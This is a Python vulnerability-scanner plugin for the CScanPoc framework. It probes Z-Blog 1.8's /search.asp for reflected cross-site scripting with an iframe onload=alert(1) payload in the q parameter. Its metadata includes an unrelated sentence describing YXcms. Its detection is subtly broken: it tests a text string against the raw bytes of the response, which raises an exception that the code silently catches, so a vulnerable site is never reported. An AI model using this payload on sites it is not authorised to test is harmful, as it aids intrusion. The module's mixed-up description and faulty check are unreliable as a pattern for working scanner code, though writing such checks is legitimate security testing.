# coding: utf-8
import urllib.request
import urllib.error
import urllib.parse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Zblog_0102'  # 平台漏洞编号，留空
    name = 'Zblog 1.8 /search.asp XSS'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2014-12-09'  # 漏洞公布时间
    desc = '''
        YXcms是一款基于PHP+MySql开发的网站管理系统，采用轻量级MVC设计模式。
        Z-Blog是由RainbowSoft Studio开发的一款小巧而强大的基于Asp和PHP平台的开源程序，其创始人为朱煊(网名：zx.asd)。
        search.asp在对用户提交数据处理上存在安全漏洞。
    '''  # 漏洞描述
    ref = 'http://sebug.net/vuldb/ssvid-19246'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Zblog'  # 漏洞应用名称
    product_version = '1.8'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '95f8bbca-3c88-4246-9dcf-f0f9d75e4e70'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/search.asp?q=%3Ciframe%20src%3D%40%20onload%3Dalert%281%29%3E'
            verify_url = self.target + payload
            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()
            if '<iframe src=@ onload=alert(1)>' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
